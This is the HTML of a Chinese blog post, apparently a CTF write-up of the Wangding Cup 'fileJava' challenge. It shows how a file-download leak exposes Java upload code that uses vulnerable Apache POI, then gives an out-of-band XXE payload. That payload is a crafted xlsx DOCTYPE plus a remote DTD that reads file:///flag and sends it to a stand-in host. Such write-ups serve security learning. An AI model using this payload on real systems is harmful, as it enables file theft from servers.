@@ -1,0 +1,211 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>网鼎杯fileJava - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="知识点
+Java 文件泄露
+XXE
+
+做题思路：
+开局可以上传文件，下载的时候可以文件泄露
+
+这样的话就可以找到三个Java文件，分别dump源码，在文件中作者给出了提示
+1234567891011,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">网鼎杯fileJava</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">网鼎杯fileJava</h1>
+        <div class="stuff">
+            <span>十二月 17, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/XXE/" rel="tag">XXE</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>Java 文件泄露</li>
+<li>XXE</li>
+</ul>
+<p>做题思路：</p>
+<p>开局可以上传文件，下载的时候可以文件泄露</p>
+<p><img src="image-20201217125640279.png" alt="image-20201217125640279"></p>
+<p>这样的话就可以找到三个Java文件，分别dump源码，在文件中作者给出了提示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">String filename;</span><br><span class="line">String fileExtName;</span><br><span class="line"><span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">    filename = fileItem.getFieldName();</span><br><span class="line">    fileExtName = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    filename = fileItem.getName();</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="keyword">null</span> &amp;&amp; !filename.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                System.out.println(sheet.getFirstRowNum());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                var20.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>故找到这个CVE：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42296449/article/details/88934150">https://blog.csdn.net/weixin_42296449/article/details/88934150</a></p>
+<p>先写一个符合正则的的用户名evcel-xxx.xlsx,将其后缀修改为zip，加上POC之后再修改回去：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://0.0.0.0/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20201217130933478.png" alt="image-20201217130933478"></p>
+<p>在反射过去的机子上面写一个1.dtd，令其远程实体调用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;0.0.0.0?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随后上传文件即可：</p>
+<p><img src="image-20201217131243814.png" alt="image-20201217131243814"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
